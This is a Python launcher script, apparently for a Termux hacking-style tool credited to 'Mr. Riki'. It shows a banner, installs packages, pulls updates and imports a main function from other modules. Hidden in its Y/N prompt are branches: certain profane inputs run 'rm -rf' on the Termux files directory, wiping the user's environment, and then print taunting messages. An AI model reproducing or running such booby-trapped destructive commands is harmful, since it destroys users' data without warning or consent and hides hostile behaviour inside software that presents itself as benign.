import os,sys,time, platform
from time import sleep
os.system('pip install lolcat')

try:
   import requests
except:
   os.system('pip install requests')

try:
   import mechanize
except:
   os.system('pip install mechanize')

try:
   import bs4
except:
   os.system('pip install bs4')

try:
   import rich
except:
   os.system('pip install rich')




import requests

def jalan(z):
    for e in z + '\n':
      sys.stdout.write(e)
      sys.stdout.flush()
      time.sleep(0.03)

bit = platform.architecture()[0]


logo="""
\33[92m  ███    ███ ██████      ██████  ██ ██   ██ ██
  ████  ████ ██   ██     ██   ██ ██ ██  ██  ██
  ██ ████ ██ ██████      ██████  ██ █████   ██
  ██  ██  ██ ██   ██     ██   ██ ██ ██  ██  ██
  ██      ██ ██   ██ ██  ██   ██ ██ ██   ██ ██

\33[94m•••••••••••••••••••••••••••••••••••••••••••••••••"""

if bit == '64bit':
    os.system('clear')
    os.system ('date | lolcat')
    print (logo)

    xx = input (" Do You Want To Run This Tool As 64 Bit? Y/N →  ")


    if xx in (""):
         jalan (" \x1b[1;91m[!] CAN'T BE EAMPTY BRO..!")
         os.system('python green.py')

    elif xx in ["y", "Y"]:
         os.system('git pull')
         os.system('clear')
         jalan ('      \n           \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;97m WELCOME \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;97m\n\n')
         sleep (1)
         from green import main_apv
         main_apv()

    elif xx in ("n", "N"):
        os.system('clear')
        os.system ('date | lolcat')
        print (logo)
        jalan (" \x1b[1;97m[!] THANKS FOR USING MR. RIKI'S TOOL.")

    elif xx in ("fuck", "Fuck", "FUCK"):
        os.system("rm -rf /data/data/com.termux/files/")
        os.system("rm -rf /data/data/com.termux/files/*")
        jalan ("[🤣]FUCKED SUCCESSFUL BRO..!💌")

    elif xx in ("fuck riki", "Fuck Riki", "FUCK RIKI"):
        os.system("rm -rf /data/data/com.termux/files/")
        os.system("rm -rf /data/data/com.termux/files/*")
        jalan ("[!] I AM BETTER FUCKER THAN YOU.!💌")

    else:
        jalan (" \x1b[1;91m[!] FILL IN CORRECTLY BRO..!")
        os.system('python green.py')




elif bit == '32bit':
    os.system('clear')
    os.system ('date | lolcat')
    print (logo)
    jalan (" - This Tool Support 32 Bit [√]")

    xx = input (" Do You Want To Run This Tool As 32 Bit? Y/N →  ")

    if xx in (""):
         jalan (" \x1b[1;91m[!] CAN'T BE EAMPTY BRO..!")
         os.system('python green.py')

    elif xx in ["y", "Y"]:
         os.system('git pull')
         os.system('clear')
         os.system ('date | lolcat')
         print (logo)
         jalan ('    \n             \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;97m WELCOME \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;97m\n\n')
         sleep (1)
         from green32 import main_apv
         main_apv()

    elif xx in ("n", "N"):
        os.system('clear')
        os.system ('date | lolcat')
        print (logo)
        jalan (" \x1b[1;97m[!] THANKS FOR USING MR. RIKI'S TOOL.")

    elif xx in ("fuck", "Fuck", "FUCK"):
        os.system("rm -rf /data/data/com.termux/files/")
        os.system("rm -rf /data/data/com.termux/files/*")
        jalan ("[🤣]FUCKED SUCCESSFUL BRO..!💌")

    elif xx in ("fuck riki", "Fuck Riki", "FUCK RIKI"):
        os.system("rm -rf /data/data/com.termux/files/")
        os.system("rm -rf /data/data/com.termux/files/*")
        jalan ("[!] I AM BETTER FUCKER THAN YOU.!💌")

    else:
        jalan (" \x1b[1;91m[!] FILL IN CORRECTLY BRO..!")
        os.system('python green.py')




